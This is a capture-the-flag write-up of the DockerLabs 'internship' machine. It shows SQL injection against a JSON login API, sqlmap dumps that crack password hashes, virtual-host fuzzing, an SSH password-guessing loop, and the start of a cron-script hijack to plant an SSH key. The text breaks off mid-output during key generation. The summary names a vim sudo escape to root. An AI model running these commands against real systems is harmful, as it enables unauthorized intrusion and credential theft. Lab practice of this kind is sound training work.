# internship

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| internship | s1egfr1ed | easy / facil | dockerlabs |

**Summary:** The internship machine presented a deeply layered exploitation path across multiple users, requiring SQL injection, password cracking, virtual host discovery, steganography, a cron-based lateral movement technique, and a sudo vim escape. The web application served under the virtual hostname `gatekeeperhr.com` exposed a JSON REST API at `/lab/login.php` that was vulnerable to SQL injection in the `username` field. Manual confirmation of the bypass was followed by three staged sqlmap invocations: first to enumerate databases, then tables, and finally to dump and crack the MD5 hashes in the `hr_users` table, yielding `mariana:sunshine` and `jorge:qwerty`. Virtual host fuzzing with ffuf against `gatekeeperhr.com` discovered a `www.` subdomain hosting what appeared to be an HR portal that revealed the password `purpl3` visually embedded within the page content, pointing to internship employees `pedro` and `valentina` from the previously enumerated employee list. A loop test across username variants confirmed `pedro` was the valid account. As `pedro`, process and filesystem enumeration discovered `/opt/log_cleaner.sh`, a world-writable script owned by `valentina` and executed periodically via cron. An SSH key pair was generated, and `log_cleaner.sh` was overwritten to inject the public key into `valentina`'s `authorized_keys`. When the cron fired, the key was installed and an SSH session was established as `valentina`. In her home directory, a `profile_picture.jpeg` was found and exfiltrated. Running `stegseek` against it extracted a hidden file with the passphrase-free payload `mag1ck`. A `sudo -l` check revealed `valentina` could run `vim` as root with a password (`listpw=always`), and `mag1ck` served as that password. The GTFOBins vim shell escape (`sudo vim -c ':!/bin/bash'`) spawned an immediate root shell, from which `su -` confirmed full root access and the final flag was captured.

---

## Reconnaissance

**1. Machine Deployment**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ sudo bash auto_deploy.sh internship.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /"""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2. Port Scan**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-30 06:19 +0700
Nmap scan report for 172.17.0.2 (172.17.0.2)
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 35:ff:c4:8b:c4:e1:46:12:43:b9:03:a9:cf:ec:f3:0a (ECDSA)
|_  256 23:ac:95:1e:be:33:9e:ed:14:f0:45:f6:27:51:ca:ba (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: GateKeeper HR | Tu Portal de Recursos Humanos
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 8A:5D:9C:11:81:6F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

The scan revealed SSH on port 22 and Apache on port 80 titled "GateKeeper HR". The virtual hostname `gatekeeperhr.com` was added to `/etc/hosts` before further enumeration.

**3. Adding the Virtual Host**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ echo "$ip gatekeeperhr.com" | sudo tee -a /etc/hosts
[sudo] password for ouba: 
172.17.0.2 gatekeeperhr.com
```

The GateKeeper HR portal was now accessible.

![](image.png)

---

## Initial Access

### Web Content Discovery

**4. Feroxbuster Directory and File Enumeration**

Feroxbuster was used to enumerate content under the `gatekeeperhr.com` virtual host.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ feroxbuster -u http://gatekeeperhr.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,js,css,env,bak,tar,zip
                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://gatekeeperhr.com/
 🚩  In-Scope Url          │ gatekeeperhr.com
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, js, css, env, bak, tar, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      322c http://gatekeeperhr.com/default => http://gatekeeperhr.com/default/
200      GET      241l      406w     3387c http://gatekeeperhr.com/css/styles.css
200      GET        1l       89w    14999c http://gatekeeperhr.com/js/script.js
301      GET        9l       28w      319c http://gatekeeperhr.com/spam => http://gatekeeperhr.com/spam/
200      GET       92l      188w     3140c http://gatekeeperhr.com/contact.html
200      GET       90l      231w     3339c http://gatekeeperhr.com/about.html
200      GET      108l      235w     3971c http://gatekeeperhr.com/index.html
200      GET      108l      235w     3971c http://gatekeeperhr.com/
301      GET        9l       28w      323c http://gatekeeperhr.com/includes => http://gatekeeperhr.com/includes/
301      GET        9l       28w      317c http://gatekeeperhr.com/js => http://gatekeeperhr.com/js/
301      GET        9l       28w      318c http://gatekeeperhr.com/css => http://gatekeeperhr.com/css/
301      GET        9l       28w      318c http://gatekeeperhr.com/lab => http://gatekeeperhr.com/lab/
200      GET       14l       32w      308c http://gatekeeperhr.com/spam/index.html
200      GET      241l      406w     3387c http://gatekeeperhr.com/default/styles.css
200      GET      107l      220w     3861c http://gatekeeperhr.com/default/index.html
200      GET        0l        0w        0c http://gatekeeperhr.com/includes/db.php
405      GET        1l        4w       61c http://gatekeeperhr.com/lab/login.php
200      GET        1l       14w      867c http://gatekeeperhr.com/lab/employees.php
[####################] - 32m  15438460/15438460 0s      found:18      errors:0      
[####################] - 31m  2205450/2205450 1202/s  http://gatekeeperhr.com/ 
[####################] - 32m  2205450/2205450 1163/s  http://gatekeeperhr.com/default/ 
[####################] - 32m  2205450/2205450 1164/s  http://gatekeeperhr.com/spam/ 
[####################] - 32m  2205450/2205450 1160/s  http://gatekeeperhr.com/includes/ 
[####################] - 32m  2205450/2205450 1159/s  http://gatekeeperhr.com/js/ 
[####################] - 32m  2205450/2205450 1161/s  http://gatekeeperhr.com/css/ 
[####################] - 32m  2205450/2205450 1163/s  http://gatekeeperhr.com/lab/  
```

Two notable endpoints appeared: `lab/employees.php` returning a JSON employee list, and `lab/login.php` returning a 405 on GET, indicating a POST-only JSON API.

**5. Fetching the Employee List**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ curl -s http://gatekeeperhr.com/lab/employees.php | jq .
{
  "status": "success",
  "employees": [
    {
      "id": "1",
      "name": "Ana Garcia",
      "department": "Ventas",
      "startDate": "2023-05-15"
    },
    {
      "id": "2",
      "name": "Carlos Rodriguez",
      "department": "IT",
      "startDate": "2023-06-01"
    },
    {
      "id": "3",
      "name": "Maria Lopez",
      "department": "Recursos Humanos",
      "startDate": "2023-06-10"
    },
    {
      "id": "4",
      "name": "Juan Martinez",
      "department": "Marketing",
      "startDate": "2023-06-15"
    },
    {
      "id": "5",
      "name": "Laura Sanchez",
      "department": "Finanzas",
      "startDate": "2023-07-01"
    },
    {
      "id": "6",
      "name": "Pedro Ramirez",
      "department": "Pasantia IT",
      "startDate": "2023-07-05"
    },
    {
      "id": "7",
      "name": "Sofia Torres",
      "department": "Ventas",
      "startDate": "2023-07-10"
    },
    {
      "id": "8",
      "name": "Diego Herrera",
      "department": "IT",
      "startDate": "2023-07-15"
    },
    {
      "id": "9",
      "name": "Valentina Gomez",
      "department": "Pasantia IT",
      "startDate": "2023-07-20"
    },
    {
      "id": "10",
      "name": "Alejandro Vargas",
      "department": "Marketing",
      "startDate": "2023-07-25"
    }
  ]
}
```

The employee list was noted in full, particularly the two "Pasantia IT" (IT Internship) employees: `Pedro Ramirez` and `Valentina Gomez`, as these were likely the system accounts of interest.

![](image-1.png)

### SQL Injection Against the Login API

**6. Manual Confirmation of the SQL Injection**

A test with default credentials confirmed failure, and a classic tautology payload in the JSON `username` field returned a success response, confirming SQL injection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ curl -s -X POST http://gatekeeperhr.com/lab/login.php -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}'
{"status":"error","message":"Credenciales incorrectas."}

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ curl -s -X POST http://gatekeeperhr.com/lab/login.php -H "Content-Type: application/json" -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' -- ","password":"x"}'
{"status":"success","message":"Bienvenido, admin' OR '1'='1' -- !"}  
```

### Automated Exploitation with sqlmap

**7. Enumerating Databases**

sqlmap was pointed at the JSON endpoint to enumerate all databases via the injectable `username` parameter.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ sqlmap -u "http://gatekeeperhr.com/lab/login.php" --data='{"username":"admin","password":"x"}' --headers="Content-Type: application/json" --ignore-code=401 --batch --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:15:54 /2026-07-30/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[08:15:54] [INFO] resuming back-end DBMS 'mysql' 
[08:15:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: {"username":"admin' AND 3577=(SELECT (CASE WHEN (3577=3577) THEN 3577 ELSE (SELECT 3842 UNION SELECT 5194) END))-- -","password":"x"}
---
[08:15:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL 5 (MariaDB fork)
[08:15:54] [INFO] fetching database names
[08:15:54] [INFO] fetching number of databases
[08:15:54] [INFO] resumed: 5
[08:15:54] [INFO] resumed: information_schema
[08:15:54] [INFO] resumed: mysql
[08:15:54] [INFO] resumed: performance_schema
[08:15:54] [INFO] resumed: sys
[08:15:54] [INFO] resumed: gatekeeperhr
available databases [5]:
[*] gatekeeperhr
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[08:15:54] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times
[08:15:54] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/gatekeeperhr.com'

[*] ending @ 08:15:54 /2026-07-30/
```

**8. Enumerating Tables in the gatekeeperhr Database**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ sqlmap -u "http://gatekeeperhr.com/lab/login.php" --data='{"username":"admin","password":"x"}' --headers="Content-Type: application/json" --ignore-code=401 --batch -D "gatekeeperhr" --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:17:00 /2026-07-30/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[08:17:00] [INFO] resuming back-end DBMS 'mysql' 
[08:17:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: {"username":"admin' AND 3577=(SELECT (CASE WHEN (3577=3577) THEN 3577 ELSE (SELECT 3842 UNION SELECT 5194) END))-- -","password":"x"}
---
[08:17:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL 5 (MariaDB fork)
[08:17:00] [INFO] fetching tables for database: 'gatekeeperhr'
[08:17:00] [INFO] fetching number of tables for database 'gatekeeperhr'
[08:17:00] [INFO] resumed: 2
[08:17:01] [INFO] resumed: employees
[08:17:01] [INFO] resumed: hr_users
Database: gatekeeperhr
[2 tables]
+-----------+
| employees |
| hr_users  |
+-----------+

[08:17:01] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times
[08:17:01] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/gatekeeperhr.com'

[*] ending @ 08:17:00 /2026-07-30/
```

**9. Dumping and Cracking the hr_users Table**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ sqlmap -u "http://gatekeeperhr.com/lab/login.php" --data='{"username":"admin","password":"x"}' --headers="Content-Type: application/json" --ignore-code=401 --batch -D "gatekeeperhr" -T "hr_users" --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:17:13 /2026-07-30/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[08:17:13] [INFO] resuming back-end DBMS 'mysql' 
[08:17:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON username ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: {"username":"admin' AND 3577=(SELECT (CASE WHEN (3577=3577) THEN 3577 ELSE (SELECT 3842 UNION SELECT 5194) END))-- -","password":"x"}
---
[08:17:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL 5 (MariaDB fork)
[08:17:13] [INFO] fetching columns for table 'hr_users' in database 'gatekeeperhr'
[08:17:13] [INFO] resumed: 5
[08:17:13] [INFO] resumed: id
[08:17:13] [INFO] resumed: first_name
[08:17:13] [INFO] resumed: last_name
[08:17:13] [INFO] resumed: username
[08:17:13] [INFO] resumed: password
[08:17:13] [INFO] fetching entries for table 'hr_users' in database 'gatekeeperhr'
[08:17:13] [INFO] fetching number of entries for table 'hr_users' in database 'gatekeeperhr'
[08:17:13] [INFO] resumed: 2
[08:17:13] [INFO] resumed: Mariana
[08:17:13] [INFO] resumed: 1
[08:17:13] [INFO] resumed: Ruiz
[08:17:13] [INFO] resumed: 0571749e2ac330a7455809c6b0e7af90
[08:17:13] [INFO] resumed: mariana
[08:17:13] [INFO] resumed: Jorge
[08:17:13] [INFO] resumed: 2
[08:17:13] [INFO] resumed: Lopez
[08:17:13] [INFO] resumed: d8578edf8458ce06fbc5bb76a58c5ca4
[08:17:13] [INFO] resumed: jorge
[08:17:13] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[08:17:13] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[08:17:13] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[08:17:13] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[08:17:13] [INFO] starting 4 processes 
[08:17:34] [INFO] cracked password 'qwerty' for user 'jorge'                                                                 
[08:17:36] [INFO] cracked password 'sunshine' for user 'mariana'                                                             
Database: gatekeeperhr                                                                                                       
Table: hr_users
[2 entries]
+----+---------------------------------------------+----------+-----------+------------+
| id | password                                    | username | last_name | first_name |
+----+---------------------------------------------+----------+-----------+------------+
| 1  | 0571749e2ac330a7455809c6b0e7af90 (sunshine) | mariana  | Ruiz      | Mariana    |
| 2  | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)   | jorge    | Lopez     | Jorge      |
+----+---------------------------------------------+----------+-----------+------------+

[08:17:48] [INFO] table 'gatekeeperhr.hr_users' dumped to CSV file '/home/ouba/.local/share/sqlmap/output/gatekeeperhr.com/dump/gatekeeperhr/hr_users.csv'
[08:17:48] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times
[08:17:48] [INFO] fetched data logged to text files under '/home/ouba/.local/share/sqlmap/output/gatekeeperhr.com'

[*] ending @ 08:17:48 /2026-07-30/
```

Both MD5 hashes were cracked: `mariana:sunshine` and `jorge:qwerty`.

**10. Verifying the Recovered Credentials Against the API**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ curl -iv -X POST http://gatekeeperhr.com/lab/login.php -H "Content-Type: application/json" -d '{"username":"mariana","password":"sunshine"}' 
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host gatekeeperhr.com:80 was resolved.
* IPv6: (none)
* IPv4: 172.17.0.2
*   Trying 172.17.0.2:80...
* Established connection to gatekeeperhr.com (172.17.0.2 port 80) from 172.17.0.1 port 47050 
* using HTTP/1.x
> POST /lab/login.php HTTP/1.1
> Host: gatekeeperhr.com
> User-Agent: curl/8.20.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 44
> 
* upload completely sent off: 44 bytes
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Thu, 30 Jul 2026 01:20:08 GMT
Date: Thu, 30 Jul 2026 01:20:08 GMT
< Server: Apache/2.4.62 (Debian)
Server: Apache/2.4.62 (Debian)
< X-Virtual-Host: gatekeeperhr.com
X-Virtual-Host: gatekeeperhr.com
< Content-Length: 53
Content-Length: 53
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8
< 

* Connection #0 to host gatekeeperhr.com:80 left intact
{"status":"success","message":"Bienvenido, mariana!"}                                                                                                                              
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ curl -iv -X POST http://gatekeeperhr.com/lab/login.php -H "Content-Type: application/json" -d '{"username":"jorge","password":"qwerty"}' 
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host gatekeeperhr.com:80 was resolved.
* IPv6: (none)
* IPv4: 172.17.0.2
*   Trying 172.17.0.2:80...
* Established connection to gatekeeperhr.com (172.17.0.2 port 80) from 172.17.0.1 port 52550 
* using HTTP/1.x
> POST /lab/login.php HTTP/1.1
> Host: gatekeeperhr.com
> User-Agent: curl/8.20.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 40
> 
* upload completely sent off: 40 bytes
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Thu, 30 Jul 2026 01:20:23 GMT
Date: Thu, 30 Jul 2026 01:20:23 GMT
< Server: Apache/2.4.62 (Debian)
Server: Apache/2.4.62 (Debian)
< X-Virtual-Host: gatekeeperhr.com
X-Virtual-Host: gatekeeperhr.com
< Content-Length: 51
Content-Length: 51
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8
< 

* Connection #0 to host gatekeeperhr.com:80 left intact
{"status":"success","message":"Bienvenido, jorge!"}  
```

Both accounts authenticated successfully against the API.

### Virtual Host Discovery

**11. ffuf Subdomain Fuzzing**

ffuf was used to fuzz for additional virtual hosts under `gatekeeperhr.com` by rotating the `Host` header.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ ffuf -u http://gatekeeperhr.com/ -H "Host: FUZZ.gatekeeperhr.com" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 3861

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://gatekeeperhr.com/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.gatekeeperhr.com
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3861
________________________________________________

www                     [Status: 200, Size: 3971, Words: 1371, Lines: 109, Duration: 0ms]
WWW                     [Status: 200, Size: 3971, Words: 1371, Lines: 109, Duration: 1ms]
Www                     [Status: 200, Size: 3971, Words: 1371, Lines: 109, Duration: 3ms]
WwW                     [Status: 200, Size: 3971, Words: 1371, Lines: 109, Duration: 3ms]
:: Progress: [220559/220559] :: Job [1/1] :: 2020 req/sec :: Duration: [0:01:08] :: Errors: 0 ::
```

A `www.gatekeeperhr.com` subdomain was discovered. It was added to `/etc/hosts`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ echo "$ip www.gatekeeperhr.com" | sudo tee -a /etc/hosts
172.17.0.2 www.gatekeeperhr.com
```

**12. Inspecting the www Subdomain**

Browsing `http://www.gatekeeperhr.com/` revealed a different web page that visually disclosed the password `purpl3`, associated with the internship employees from the employee list.

![](image-2.png)

![](image-3.png)

### SSH Access as pedro

**13. Identifying the Valid SSH Username**

The password `purpl3` was tested against username variants derived from the two internship employees (`pedro` and `valentina`) using `sshpass` in a loop.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ for u in pedro pedro.ramirez pramirez valentina valentina.gomez vgomez; do
  echo "== $u =="
  sshpass -p 'purpl3' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$u@$ip" exit 2>&1 | tail -1
done
== pedro ==
== pedro.ramirez ==
Permission denied, please try again.
== pramirez ==
Permission denied, please try again.
== valentina ==
Permission denied, please try again.
== valentina.gomez ==
Permission denied, please try again.
== vgomez ==
Permission denied, please try again.
```

The `pedro` variant produced no "Permission denied" output, indicating a successful authentication. SSH was established directly.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/internship]
└─$ ssh pedro@$ip           
pedro@172.17.0.2's password: 
Linux b8168e4d1ebc 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
pedro@b8168e4d1ebc:~$ id;whoami;hostname
uid=1000(pedro) gid=1000(pedro) groups=1000(pedro)
pedro
b8168e4d1ebc
pedro@b8168e4d1ebc:~$ cat fl4g.txt 
                           _
                        _ooOoo_
                       o8888888o
                       88" . "88
                       (| -_- |)
                       O\  =  /O
                    ____/`---'\____
                  .'  \\|     |//  `.
                 /  \\|||  :  |||//  \
                /  _||||| -:- |||||_  \
                |   | \\\  -  /'| |   |
                | \_|  `\`---'//  |_/ |
                \  .-\__ `-. -'__/-.  /
              ___`. .'  /--.--\  `. .'___
           ."" '<  `.___|_<|>_|___.'>  \"".
          | | :  `- \`. ;`. _/; .'/ /  .' ; |
          \  \ `-.   \_\_`. _.'_/_/  -' _.' /
===========`-.`___`-.__\ \___  /__.-'_.'_.-'================
                        `=--=-'                    

                      ~ Sigue asi ~
```

A foothold was established as `pedro`, and the first flag was captured.

---

## Lateral Movement

### Cron-Based SSH Key Injection to valentina

**14. Enumerating Users, /opt, and Running Processes**

User enumeration and process listing revealed a cron job running as `valentina` periodically executing `/opt/log_cleaner.sh`.

```bash
pedro@b8168e4d1ebc:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
pedro:x:1000:1000::/home/pedro:/bin/bash
valentina:x:1001:1001::/home/valentina:/bin/bash
pedro@b8168e4d1ebc:~$ ls -la /home
total 16
drwxr-xr-x 1 root      root      4096 Feb 10  2025 .
drwxr-xr-x 1 root      root      4096 Jul 29 23:14 ..
drwxrwx--- 1 pedro     pedro     4096 Feb 10  2025 pedro
drwxrwx--- 1 valentina valentina 4096 Feb 10  2025 valentina
```

```bash
pedro@b8168e4d1ebc:~$ ls -la /opt
total 12
drwxr-xr-x 1 root      root      4096 Feb 10  2025 .
drwxr-xr-x 1 root      root      4096 Jul 29 23:14 ..
-rwxrw-rw- 1 valentina valentina   30 Feb  9  2025 log_cleaner.sh
pedro@b8168e4d1ebc:~$ cat /opt/log_cleaner.sh 
#!/bin/bash
rm -rf /var/log/*
```

```bash
pedro@b8168e4d1ebc:~$ ps aux 
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   3932  3008 ?        Ss   Jul29   0:00 /bin/bash /entrypoint.sh
root          23  0.0  0.4 201816 16324 ?        Ss   Jul29   0:03 /usr/sbin/apache2 -k start
root          43  0.0  0.1  15444  4428 ?        Ss   Jul29   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          50  0.0  0.0   3608  1932 ?        Ss   Jul29   0:00 /usr/sbin/cron
root          77  0.0  0.0   2584  1792 ?        S    Jul29   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        202  0.6  2.6 1407184 99816 ?       Sl   Jul29   0:51 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql 
root         203  0.0  0.0   5952  2572 ?        S    Jul29   0:00 logger -t mysqld -p daemon error
root         262  0.0  0.0   2524  1348 ?        S    Jul29   0:00 tail -f /dev/null
www-data    5367  0.5  0.2 202564 11124 ?        S    01:22   0:04 /usr/sbin/apache2 -k start
www-data    5516  0.3  0.2 202412 10752 ?        S    01:26   0:01 /usr/sbin/apache2 -k start
www-data    5519  0.2  0.2 202412 10752 ?        S    01:26   0:01 /usr/sbin/apache2 -k start
www-data    5522  0.1  0.2 202412 10752 ?        S    01:26   0:00 /usr/sbin/apache2 -k start
www-data    5530  0.1  0.2 202412 10752 ?        S    01:26   0:00 /usr/sbin/apache2 -k start
www-data    5531  0.1  0.2 202412 10752 ?        S    01:26   0:00 /usr/sbin/apache2 -k start
www-data    5534  0.2  0.2 202412 10752 ?        S    01:26   0:01 /usr/sbin/apache2 -k start
www-data    5541  0.2  0.2 202412 10756 ?        S    01:26   0:01 /usr/sbin/apache2 -k start
www-data    5557  0.1  0.2 202412 10756 ?        S    01:26   0:00 /usr/sbin/apache2 -k start
www-data    5574  0.1  0.2 202412 10756 ?        S    01:26   0:00 /usr/sbin/apache2 -k start
root        5744  0.0  0.3  18092 11516 ?        Ss   01:30   0:00 sshd: pedro [priv]
pedro       5750  0.1  0.1  18092  7160 ?        S    01:30   0:00 sshd: pedro@pts/0
pedro       5751  0.0  0.0   4196  3516 pts/0    Ss   01:30   0:00 -bash
root        5915  0.1  0.0   5988  3368 ?        S    01:34   0:00 /usr/sbin/CRON
root        5916  0.1  0.0   5988  3368 ?        S    01:34   0:00 /usr/sbin/CRON
valenti+    5919  0.0  0.0   2584  1704 ?        Ss   01:34   0:00 /bin/sh -c sleep 30; /opt/log_cleaner.sh
valenti+    5921  0.0  0.0   2584  1704 ?        Ss   01:34   0:00 /bin/sh -c sleep 45; /opt/log_cleaner.sh
valenti+    5924  0.0  0.0   2492  1392 ?        S    01:34   0:00 sleep 45
valenti+    5925  0.0  0.0   2492  1404 ?        S    01:34   0:00 sleep 30
pedro       5944 50.0  0.1   8108  4416 pts/0    R+   01:34   0:00 ps aux
```

The process list confirmed that cron was running `/opt/log_cleaner.sh` periodically as `valentina`. Since the script was world-writable, it could be replaced with a payload to inject an SSH key into `valentina`'s account.

**15. Generating an SSH Key Pair and Overwriting the Cron Script**

A new ED25519 key pair was generated and `log_cleaner.sh` was overwritten to inject the public key into `valentina`'s `authorized_keys` on the next cron run.

```bash
pedro@b8168e4d1ebc:~$ ssh-keygen -t ed25519 -f ./valentina_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in ./valentina_key
Your public key has been saved in ./valentina_key.pub
The key fingerprint is:
SHA256:Wf1zLawL78AIA7BODgc8+y/BymbswGkpciGknAzltL4 pedro@b8168e4d1ebc
The key's randomart image is:
+--[ED25519 256]--+
|o +              |
| B +       .     |
|o.O .     . .    |
|*O.  .   o   o  .|
